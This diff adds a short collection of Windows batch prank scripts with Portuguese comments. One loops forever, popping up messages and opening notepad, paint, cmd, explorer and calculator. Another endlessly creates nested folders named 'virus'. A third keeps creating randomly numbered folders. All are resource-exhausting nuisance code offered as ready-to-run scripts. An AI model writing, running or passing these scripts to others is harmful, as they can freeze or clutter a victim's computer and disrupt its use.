@@ -1,0 +1,28 @@
+@echo off
+:loop
+msg *ta ai
+msg *blz?
+start notepad
+start mspaint
+start cmd
+start explorer
+start calc
+
+goto loop
+
+--- criar uma pasta, ir pra dentro da pasta e criar outra..
+
+@echo off
+:loop
+md virus
+cd virus
+goto loop
+
+--- criar várias pastas com numeros aleatorios no desktop, cria no mesmo local
+@echo off
+:loop
+md %random%
+goto loop
+
+
+
